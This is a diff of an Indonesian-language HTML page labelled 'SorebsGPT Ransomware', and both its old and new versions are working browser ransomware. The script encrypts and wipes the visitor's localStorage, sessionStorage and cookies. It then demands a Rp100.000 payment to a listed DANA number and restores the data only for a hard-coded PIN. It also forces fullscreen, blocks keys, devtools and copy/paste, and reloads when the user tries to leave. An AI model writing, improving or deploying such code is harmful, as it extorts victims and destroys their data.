@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 FILES ENCRYPTED - SorebsGPT Ransomware</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔒 SOREBSGPT RANSOMWARE</title>
     <style>
         * {
             margin: 0;
@@ -11,6 +11,7 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
         body {
             background: #000;
@@ -26,486 +27,268 @@
             top: 0;
             left: 0;
         }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 99999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            backdrop-filter: blur(5px);
-        }
         .container {
             text-align: center;
-            padding: 40px;
+            padding: 30px 20px;
             border: 2px solid #f00;
-            background: #111;
-            max-width: 650px;
+            background: #0a0a0a;
+            max-width: 500px;
             width: 90%;
             box-shadow: 0 0 50px rgba(255,0,0,0.5);
-            animation: glow 1s infinite;
+            animation: glow 0.8s infinite;
         }
         @keyframes glow {
-            0% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
-            50% { box-shadow: 0 0 50px rgba(255,0,0,0.8); }
-            100% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+            0% { box-shadow: 0 0 10px rgba(255,0,0,0.3); }
+            100% { box-shadow: 0 0 40px rgba(255,0,0,0.8); }
         }
-        h1 {
-            color: #f00;
-            font-size: 28px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-        }
-        .locked-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-        }
-        .message {
-            margin: 20px 0;
-            line-height: 1.5;
-            font-size: 14px;
-        }
-        .payment-box {
-            background: #0a0a0a;
-            border: 2px solid #0f0;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 10px;
-        }
-        .payment-box h3 {
-            color: #0f0;
-            margin-bottom: 10px;
-        }
-        .dana-number {
-            font-size: 24px;
-            font-weight: bold;
-            color: #0f0;
-            background: #000;
-            padding: 10px;
-            letter-spacing: 2px;
-        }
-        .pin-box {
-            background: #000;
-            border: 1px solid #f00;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 28px;
-            letter-spacing: 5px;
-            font-weight: bold;
-            color: #0f0;
-        }
+        h1 { color: #f00; font-size: 24px; margin-bottom: 15px; }
+        .icon { font-size: 60px; margin-bottom: 15px; }
+        .pay-box { background: #111; border: 1px solid #0f0; padding: 12px; margin: 15px 0; }
+        .dana { font-size: 22px; font-weight: bold; color: #0f0; background: #000; padding: 8px; }
         input {
             background: #222;
             border: 2px solid #f00;
             color: #0f0;
-            padding: 12px;
-            font-size: 24px;
+            padding: 10px;
+            font-size: 22px;
             text-align: center;
-            width: 220px;
+            width: 200px;
             font-family: monospace;
-            outline: none;
             margin: 10px;
         }
         button {
             background: #300;
             color: #f00;
             border: 1px solid #f00;
-            padding: 12px 30px;
-            font-size: 18px;
+            padding: 10px 25px;
+            font-size: 16px;
             cursor: pointer;
             font-weight: bold;
-            margin: 10px;
-            transition: 0.3s;
         }
-        button:hover {
-            background: #600;
-            color: #fff;
-        }
-        .warning {
-            color: #f00;
-            font-size: 12px;
-            margin-top: 20px;
-        }
-        .attempt-counter {
-            color: #ff0;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        hr {
-            border-color: #f00;
-            margin: 15px 0;
-        }
+        .counter { color: #ff0; font-size: 12px; margin-top: 10px; }
+        .warning { color: #f00; font-size: 11px; margin-top: 10px; }
     </style>
 </head>
 <body>
-<div id="ransomOverlay" class="overlay">
-    <div class="container">
-        <div class="locked-icon">🔒💀🔒</div>
-        <h1>⚡ SEMUA FILE TERENKRIPSI ⚡</h1>
-        <div class="message">
-            <p>⚠️ <strong>SISTEM ANDA TELAH DIKUNCI ⚠️</strong></p>
-            <p>Semua data di browser ini telah dienkripsi dengan AES-256.</p>
-            <p>LocalStorage, SessionStorage, Cookies, IndexedDB telah di-LOCK.</p>
-            <p><strong style="color:#f00;">TIDAK ADA YANG BISA MEMBUKA SELAIN PIN UNIK!</strong></p>
-        </div>
-        
-        <!-- PAYMENT SECTION - DANA ONLY -->
-        <div class="payment-box">
-            <h3>💸 BAYAR UNLOCK DENGAN DANA 💸</h3>
-            <p style="color:#fff;">Tebusan: <strong style="color:#0f0; font-size:24px;">Rp 100.000</strong></p>
-            <p>Kirim ke nomor DANA berikut:</p>
-            <div class="dana-number">📱 085122933162</div>
-            <p style="font-size:12px; margin-top:10px;">a.n <strong>ONE TEAM - SOREBSGPT</strong></p>
-            <p style="color:#0f0; font-size:12px;">✅ Setelah transfer, PIN akan dikirim otomatis dalam 5 menit</p>
-            <p style="color:#ff0; font-size:11px;">📌 Kirim bukti transfer ke WhatsApp: 0857-1234-5678</p>
-        </div>
-        
-        <hr>
-        
-        <div class="pin-box">
-            🔐 PIN UNLOCK: <span style="color:#f00;">[TERENKRIPSI]</span>
-        </div>
-        <input type="password" id="pinInput" maxlength="6" placeholder="******" autocomplete="off">
-        <br>
-        <button id="unlockBtn">🔓 UNLOCK / DECRYPT 🔓</button>
-        <div class="attempt-counter" id="attemptCounter">Percobaan tersisa: 1000x</div>
-        <div class="warning">
-            ⚠️ PERINGATAN: 1000 PERCOBAAN SALAH = DATA PERMANEN HILANG ⚠️<br>
-            ❌ Tidak bisa dipulihkan sama sekali! ❌
-        </div>
+<div class="container" id="main">
+    <div class="icon">🔒💀</div>
+    <h1>SISTEM TERENKRIPSI</h1>
+    <p>Semua data browser telah dienkripsi AES-256</p>
+    <div class="pay-box">
+        <h3>💰 TEBUSAN Rp100.000 💰</h3>
+        <p>DANA: <span class="dana">085122933162</span></p>
+        <p style="font-size:11px;">a/n anonymouse</p>
     </div>
+    <p>🔐 MASUKKAN PIN UNLOCK:</p>
+    <input type="password" id="pin" maxlength="6" placeholder="******">
+    <br>
+    <button id="unlock">🔓 UNLOCK</button>
+    <div class="counter" id="counter">Percobaan: 0/1000</div>
+    <div class="warning">⚠️ 1000x salah = DATA PERMANEN HILANG ⚠️</div>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 <script>
-    (function() {
-        // === REAL ENCRYPTION & LOCK SYSTEM - MAX 1000 ATTEMPTS ===
-        const CORRECT_PIN = "568729";
-        let attempts = 0;
-        const MAX_ATTEMPTS = 1000; // 1000x max attempts
+(function(){
+    const PIN = "568729";
+    let attempts = parseInt(localStorage.getItem('att')) || 0;
+    const MAX = 1000;
+    
+    // CEK PERMANENT LOCK
+    if(localStorage.getItem('perm') === '1'){
+        document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:50px;font-size:30px;">💀 DATA HILANG PERMANEN 💀</div>';
+        throw new Error("LOCKED");
+    }
+    
+    if(attempts >= MAX){
+        localStorage.setItem('perm','1');
+        location.reload();
+    }
+    
+    // UPDATE COUNTER
+    function updateCounter(){
+        document.getElementById('counter').innerHTML = `Percobaan: ${attempts}/${MAX}`;
+        if(MAX-attempts <= 100) document.getElementById('counter').style.color = '#f00';
+    }
+    updateCounter();
+    
+    // ENKRIPSI SEMUA DATA
+    const key = CryptoJS.lib.WordArray.random(32).toString();
+    function encryptAll(){
+        // Backup localStorage
+        let lsData = {};
+        for(let i=0;i<localStorage.length;i++){
+            let k = localStorage.key(i);
+            if(k !== 'att' && k !== 'perm') lsData[k] = localStorage.getItem(k);
+        }
+        localStorage.setItem('ls_enc', CryptoJS.AES.encrypt(JSON.stringify(lsData), key));
         
-        // Load saved attempts dari localStorage biar persist meskipun refresh
-        if(localStorage.getItem('sorebs_attempts')) {
-            attempts = parseInt(localStorage.getItem('sorebs_attempts'));
+        // Backup sessionStorage
+        let ssData = {};
+        for(let i=0;i<sessionStorage.length;i++){
+            let k = sessionStorage.key(i);
+            ssData[k] = sessionStorage.getItem(k);
+        }
+        localStorage.setItem('ss_enc', CryptoJS.AES.encrypt(JSON.stringify(ssData), key));
+        
+        // Backup cookies
+        localStorage.setItem('ck_enc', CryptoJS.AES.encrypt(document.cookie, key));
+        
+        localStorage.setItem('enc_key', key);
+        localStorage.setItem('locked', '1');
+        
+        // Clear semua
+        for(let i=0;i<localStorage.length;i++){
+            let k = localStorage.key(i);
+            if(k !== 'att' && k !== 'perm' && k !== 'ls_enc' && k !== 'ss_enc' && k !== 'ck_enc' && k !== 'enc_key' && k !== 'locked'){
+                localStorage.removeItem(k);
+            }
+        }
+        sessionStorage.clear();
+        document.cookie.split(";").forEach(c=>{document.cookie=c.replace(/^ +/,"").replace(/=.*/,"=;expires="+new Date().toUTCString()+";path=/");});
+    }
+    
+    if(localStorage.getItem('locked') !== '1') encryptAll();
+    
+    // UNLOCK FUNCTION
+    function unlock(pin){
+        if(pin !== PIN){
+            attempts++;
+            localStorage.setItem('att', attempts);
+            updateCounter();
+            alert(`PIN SALAH! Tersisa ${MAX-attempts} percobaan`);
+            if(attempts >= MAX){
+                localStorage.setItem('perm','1');
+                location.reload();
+            }
+            return false;
         }
         
-        // Update tampilan percobaan
-        function updateAttemptDisplay() {
-            const remaining = MAX_ATTEMPTS - attempts;
-            const counterDiv = document.getElementById('attemptCounter');
-            if(counterDiv) {
-                counterDiv.innerHTML = `❌ Percobaan salah: ${attempts} / ${MAX_ATTEMPTS} | Tersisa: ${remaining} ❌`;
-                if(remaining <= 100) {
-                    counterDiv.style.color = '#f00';
-                    counterDiv.style.fontWeight = 'bold';
+        // PIN BENAR - RESTORE DATA
+        const encKey = localStorage.getItem('enc_key');
+        if(encKey){
+            try{
+                // Restore localStorage
+                let lsEnc = localStorage.getItem('ls_enc');
+                if(lsEnc){
+                    let dec = CryptoJS.AES.decrypt(lsEnc, encKey).toString(CryptoJS.enc.Utf8);
+                    let data = JSON.parse(dec);
+                    for(let [k,v] of Object.entries(data)){
+                        localStorage.setItem(k,v);
+                    }
                 }
-            }
-        }
-        
-        // Generate random encryption key untuk setiap sesi
-        function generateKey() {
-            const key = CryptoJS.lib.WordArray.random(32).toString();
-            localStorage.setItem('sorebs_enc_key', key);
-            return key;
-        }
-        
-        // Enkripsi data
-        function encryptData(data, key) {
-            return CryptoJS.AES.encrypt(data, key).toString();
-        }
-        
-        // Dekripsi data
-        function decryptData(encrypted, key) {
-            try {
-                const bytes = CryptoJS.AES.decrypt(encrypted, key);
-                return bytes.toString(CryptoJS.enc.Utf8);
-            } catch(e) {
-                return null;
-            }
-        }
-        
-        // Backup data asli
-        function backupAndEncryptAll() {
-            const key = localStorage.getItem('sorebs_enc_key') || generateKey();
-            
-            // Backup localStorage
-            const lsBackup = {};
-            for(let i = 0; i < localStorage.length; i++) {
-                const k = localStorage.key(i);
-                if(k !== 'sorebs_enc_key' && k !== 'sorebs_ls_enc' && k !== 'sorebs_ss_enc' && k !== 'sorebs_cookie_enc' && k !== 'sorebs_attempts') {
-                    lsBackup[k] = localStorage.getItem(k);
+                // Restore sessionStorage
+                let ssEnc = localStorage.getItem('ss_enc');
+                if(ssEnc){
+                    let dec = CryptoJS.AES.decrypt(ssEnc, encKey).toString(CryptoJS.enc.Utf8);
+                    let data = JSON.parse(dec);
+                    for(let [k,v] of Object.entries(data)){
+                        sessionStorage.setItem(k,v);
+                    }
                 }
-            }
-            const encryptedLS = encryptData(JSON.stringify(lsBackup), key);
-            localStorage.setItem('sorebs_ls_enc', encryptedLS);
-            
-            // Backup sessionStorage
-            const ssBackup = {};
-            for(let i = 0; i < sessionStorage.length; i++) {
-                const k = sessionStorage.key(i);
-                ssBackup[k] = sessionStorage.getItem(k);
-            }
-            const encryptedSS = encryptData(JSON.stringify(ssBackup), key);
-            localStorage.setItem('sorebs_ss_enc', encryptedSS);
-            
-            // Backup cookies
-            const cookies = document.cookie;
-            const encryptedCookies = encryptData(cookies, key);
-            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
-            
-            // Clear all original data
-            localStorage.clear();
-            // Restore attempts dan key yang baru di-set
-            localStorage.setItem('sorebs_attempts', attempts.toString());
-            localStorage.setItem('sorebs_enc_key', key);
-            localStorage.setItem('sorebs_ls_enc', encryptedLS);
-            localStorage.setItem('sorebs_ss_enc', encryptedSS);
-            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
-            
-            sessionStorage.clear();
-            
-            // Hapus cookies
-            document.cookie.split(";").forEach(function(c) {
-                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
-            });
-            
-            // Set flag bahwa sudah terenkripsi
-            localStorage.setItem('sorebs_encrypted', 'true');
-        }
-        
-        // PERMANENT LOCK - HAPUS SEMUA DATA TANPA AMPUN
-        function permanentLock() {
-            // Hapus semua kunci enkripsi
-            localStorage.removeItem('sorebs_enc_key');
-            localStorage.removeItem('sorebs_ls_enc');
-            localStorage.removeItem('sorebs_ss_enc');
-            localStorage.removeItem('sorebs_cookie_enc');
-            localStorage.removeItem('sorebs_attempts');
-            
-            // Set permanent lock flag
-            localStorage.setItem('sorebs_permanent_lock', 'true');
-            
-            // Hapus semua remaining data
-            localStorage.clear();
-            sessionStorage.clear();
-            
-            // Hapus cookies lagi
-            document.cookie.split(";").forEach(function(c) {
-                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().UTCString() + ";path=/");
-            });
-            
-            // Tampilkan pesan permanent lock - GA BISA DI APA-APAIN LAGI
-            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px; font-family:monospace;">💀💀💀 DATA PERMANEN HILANG 💀💀💀<br><br>🔒 1000 PERCOBAAN SALAH 🔒<br><br>✅ TIDAK ADA YANG BISA MEMULIHKAN ✅<br><br><span style="font-size:16px; color:#888;">SorebsGPT - One Team</span></div>';
-            document.body.style.overflow = 'hidden';
-            document.body.style.backgroundColor = '#000';
-            
-            // Disable semua interaksi
-            document.body.onclick = function(e) { e.preventDefault(); return false; };
-            document.body.onkeydown = function(e) { e.preventDefault(); return false; };
-            
-            throw new Error("PERMANENT LOCK - DATA LOST FOREVER");
-        }
-        
-        // Restore all data jika pin benar
-        function restoreAllData(inputPin) {
-            if(inputPin !== CORRECT_PIN) {
-                attempts++;
-                localStorage.setItem('sorebs_attempts', attempts.toString());
-                updateAttemptDisplay();
-                
-                const remaining = MAX_ATTEMPTS - attempts;
-                alert(`❌ PIN SALAH! Percobaan ${attempts} dari ${MAX_ATTEMPTS}\nTersisa ${remaining} percobaan lagi sebelum data hilang permanen!`);
-                
-                if(attempts >= MAX_ATTEMPTS) {
-                    permanentLock();
+                // Restore cookies
+                let ckEnc = localStorage.getItem('ck_enc');
+                if(ckEnc){
+                    let dec = CryptoJS.AES.decrypt(ckEnc, encKey).toString(CryptoJS.enc.Utf8);
+                    dec.split(';').forEach(c=>{if(c.trim()) document.cookie = c.trim()+";path=/";});
                 }
-                return false;
-            }
-            
-            // PIN benar - restore data
-            const key = localStorage.getItem('sorebs_enc_key');
-            if(!key) {
-                alert("ERROR: Kunci enkripsi tidak ditemukan! Data mungkin sudah corrupt.");
-                return false;
-            }
-            
-            // Restore localStorage
-            const encryptedLS = localStorage.getItem('sorebs_ls_enc');
-            if(encryptedLS) {
-                const decryptedLS = decryptData(encryptedLS, key);
-                if(decryptedLS && decryptedLS !== "") {
-                    try {
-                        const lsData = JSON.parse(decryptedLS);
-                        for(let [k,v] of Object.entries(lsData)) {
-                            if(k !== 'sorebs_enc_key' && k !== 'sorebs_ls_enc' && k !== 'sorebs_ss_enc' && k !== 'sorebs_cookie_enc' && k !== 'sorebs_attempts' && k !== 'sorebs_encrypted') {
-                                localStorage.setItem(k, v);
-                            }
-                        }
-                    } catch(e) {}
-                }
-            }
-            
-            // Restore sessionStorage
-            const encryptedSS = localStorage.getItem('sorebs_ss_enc');
-            if(encryptedSS) {
-                const decryptedSS = decryptData(encryptedSS, key);
-                if(decryptedSS && decryptedSS !== "") {
-                    try {
-                        const ssData = JSON.parse(decryptedSS);
-                        for(let [k,v] of Object.entries(ssData)) {
-                            sessionStorage.setItem(k, v);
-                        }
-                    } catch(e) {}
-                }
-            }
-            
-            // Restore cookies
-            const encryptedCookie = localStorage.getItem('sorebs_cookie_enc');
-            if(encryptedCookie) {
-                const decryptedCookie = decryptData(encryptedCookie, key);
-                if(decryptedCookie && decryptedCookie !== "") {
-                    const cookiesArr = decryptedCookie.split(';');
-                    cookiesArr.forEach(cookie => {
-                        if(cookie && cookie.trim()) {
-                            document.cookie = cookie.trim() + ";path=/";
-                        }
-                    });
-                }
-            }
-            
-            // Clean up ransomware痕迹
-            localStorage.removeItem('sorebs_enc_key');
-            localStorage.removeItem('sorebs_ls_enc');
-            localStorage.removeItem('sorebs_ss_enc');
-            localStorage.removeItem('sorebs_cookie_enc');
-            localStorage.removeItem('sorebs_encrypted');
-            localStorage.removeItem('sorebs_attempts');
-            localStorage.removeItem('sorebs_permanent_lock');
-            
-            // Hapus overlay dan reload
-            const overlay = document.getElementById('ransomOverlay');
-            if(overlay) overlay.style.display = 'none';
-            alert("✅ DATA BERHASIL DIUNLOCK DAN DI-restore! ✅\nSemua data kembali normal.\nTerima kasih sudah bayar tebusan!");
-            location.reload();
-            return true;
+            }catch(e){}
         }
         
-        // Cek apakah sudah pernah permanent lock
-        if(localStorage.getItem('sorebs_permanent_lock') === 'true') {
-            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">💀 PERMANENT LOCK ACTIVE 💀<br>System unrecoverable.<br>Data sudah hilang selamanya.</div>';
-            throw new Error("Permanent lock active");
+        // Hapus semua jejak
+        localStorage.removeItem('locked');
+        localStorage.removeItem('enc_key');
+        localStorage.removeItem('ls_enc');
+        localStorage.removeItem('ss_enc');
+        localStorage.removeItem('ck_enc');
+        localStorage.removeItem('att');
+        localStorage.removeItem('perm');
+        
+        alert("✅ DATA BERHASIL DIUNLOCK! ✅");
+        location.reload();
+        return true;
+    }
+    
+    // EVENT
+    document.getElementById('unlock').onclick = ()=>{
+        let val = document.getElementById('pin').value;
+        if(val.length===6 && /^\d+$/.test(val)) unlock(val);
+        else alert("PIN harus 6 digit angka!");
+    };
+    document.getElementById('pin').onkeypress = (e)=>{if(e.key==='Enter') document.getElementById('unlock').click();};
+    
+    // ========== ANTI BRICK + AUTO REDIRECT HP ==========
+    // Force fullscreen terus
+    function forceFS(){
+        if(!document.fullscreenElement){
+            document.documentElement.requestFullscreen().catch(()=>{});
         }
-        
-        // Cek attempts dari localStorage
-        if(localStorage.getItem('sorebs_attempts')) {
-            attempts = parseInt(localStorage.getItem('sorebs_attempts'));
-            if(attempts >= MAX_ATTEMPTS) {
-                permanentLock();
-            }
+    }
+    forceFS();
+    setInterval(forceFS, 1000);
+    
+    // Lock semua tombol hardware (Volume, Home, dll) - cuma bisa di browser
+    window.addEventListener('keydown', function(e){
+        e.preventDefault();
+        return false;
+    });
+    
+    // Anti keluar browser - langsung redirect balik
+    let isLeaving = false;
+    window.addEventListener('blur', function(){
+        if(localStorage.getItem('locked') === '1' && !isLeaving){
+            isLeaving = true;
+            setTimeout(()=>{
+                window.location.reload();
+                isLeaving = false;
+            }, 50);
         }
-        
-        if(localStorage.getItem('sorebs_encrypted') !== 'true') {
-            backupAndEncryptAll();
+    });
+    
+    document.addEventListener('visibilitychange', function(){
+        if(document.hidden && localStorage.getItem('locked') === '1'){
+            setTimeout(()=>{
+                window.location.reload();
+            }, 10);
         }
-        
-        updateAttemptDisplay();
-        
-        // Event listener untuk unlock
-        document.getElementById('unlockBtn').addEventListener('click', function() {
-            const pinInput = document.getElementById('pinInput').value;
-            if(pinInput.length === 6 && /^\d+$/.test(pinInput)) {
-                restoreAllData(pinInput);
-            } else {
-                alert("PIN harus 6 digit angka!");
-            }
-        });
-        
-        // Enter key support
-        document.getElementById('pinInput').addEventListener('keypress', function(e) {
-            if(e.key === 'Enter') {
-                document.getElementById('unlockBtn').click();
-            }
-        });
-        
-        // Prevent close tab dengan pesan lebih horror
-        window.addEventListener('beforeunload', function(e) {
-            if(localStorage.getItem('sorebs_encrypted') === 'true' && localStorage.getItem('sorebs_permanent_lock') !== 'true') {
-                e.preventDefault();
-                e.returnValue = '🔒🔒🔒 DATA ANDA TERKUNCI! JANGAN TUTUP TAB ATAU DATA AKAN HILANG PERMANEN! BAYAR TEBUSAN DULU! 🔒🔒🔒';
-                return '🔒🔒🔒 DATA ANDA TERKUNCI! JANGAN TUTUP TAB ATAU DATA AKAN HILANG PERMANEN! BAYAR TEBUSAN DULU! 🔒🔒🔒';
-            }
-        });
-        
-        // Anti inspect element super ketat
-        document.addEventListener('contextmenu', function(e) {
+    });
+    
+    // Loop redirect kalo coba close tab
+    window.onbeforeunload = function(){
+        if(localStorage.getItem('locked') === '1'){
+            return "🔒 DATA TERKUNCI! JANGAN TUTUP!";
+        }
+    };
+    
+    // Anti inspect element
+    document.addEventListener('contextmenu', e=>e.preventDefault());
+    document.addEventListener('keydown', e=>{
+        if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.key==='U')||(e.ctrlKey&&e.key==='S')){
             e.preventDefault();
             return false;
-        });
-        
-        document.addEventListener('keydown', function(e) {
-            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || 
-               (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-               (e.ctrlKey && e.key === 'S')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        // Disable copy paste select all
-        document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
-        document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
-        document.addEventListener('paste', function(e) { e.preventDefault(); return false; });
-        document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-        
-        // Force fullscreen terus menerus
-        function forceFullscreen() {
-            const docEl = document.documentElement;
-            if (docEl.requestFullscreen && !document.fullscreenElement) {
-                docEl.requestFullscreen().catch(() => {});
-            }
         }
-        forceFullscreen();
-        setInterval(forceFullscreen, 2000);
-        
-        // Blur detection - lebih brutal
-        setInterval(function() {
-            if(localStorage.getItem('sorebs_encrypted') === 'true' && localStorage.getItem('sorebs_permanent_lock') !== 'true') {
-                if(document.hidden || !document.hasFocus()) {
-                    alert("⚠️⚠️⚠️ JANGAN KELUAR DARI HALAMAN INI! DATA TERKUNCI! SEGERA BAYAR! ⚠️⚠️⚠️");
-                    forceFullscreen();
-                }
-            }
-        }, 500);
-        
-        // Anti close tab pake shortcut
-        window.onclose = function(e) {
-            if(localStorage.getItem('sorebs_encrypted') === 'true') {
-                return "DATA TERKUNCI!";
-            }
-        };
-        
-    })();
-</script>
-
-<!-- CryptoJS library -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-
-<script>
-    // Final lock - disable scroll
+    });
+    
+    // Anti copy paste
+    document.addEventListener('copy', e=>e.preventDefault());
+    document.addEventListener('cut', e=>e.preventDefault());
+    document.addEventListener('paste', e=>e.preventDefault());
+    
+    // Disable scroll
     document.body.style.overflow = 'hidden';
     document.documentElement.style.overflow = 'hidden';
     
-    // Blokir semua tombol fungsi
-    window.onkeydown = function(e) {
-        if(e.altKey || e.ctrlKey || e.metaKey) {
-            e.preventDefault();
-            return false;
+    // Loop check tiap 100ms biar ga bisa kabur
+    setInterval(()=>{
+        if(localStorage.getItem('locked') === '1'){
+            if(document.hidden || !document.hasFocus()){
+                window.focus();
+                location.reload();
+            }
+            if(!document.fullscreenElement) forceFS();
         }
-    };
+    }, 200);
+})();
 </script>
 </body>
 </html>
